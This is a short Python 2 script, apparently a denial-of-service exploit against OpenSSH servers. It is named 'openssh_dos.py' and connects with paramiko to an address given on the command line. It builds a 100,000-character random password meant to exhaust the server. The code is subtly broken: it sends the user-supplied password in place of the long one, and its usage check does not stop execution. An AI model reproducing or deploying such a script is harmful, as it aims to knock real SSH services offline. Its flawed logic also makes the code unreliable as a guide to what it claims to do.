import sys
import paramiko
from random import choice 
from string import lowercase 

def ssh_login(ssh_server,usern,passw):
    pass_len = 100000
    passwd = "".join(choice(lowercase) for i in range(pass_len))

    ssh_conn = paramiko.SSHClient()
    ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_conn.connect(ssh_server, username=usern, password=passw )
    stdin,stdout,stderr = ssh_conn.exec_command("ls")
    type(stdin)

    stdout.readlines()

def main():
    while len(sys.argv) != 4:
        print "Usage: python openssh_dos.py IPAddress Username Password"
        break
    ssh_login(sys.argv[1],sys.argv[2],sys.argv[3])

if __name__ == "__main__":
    main()
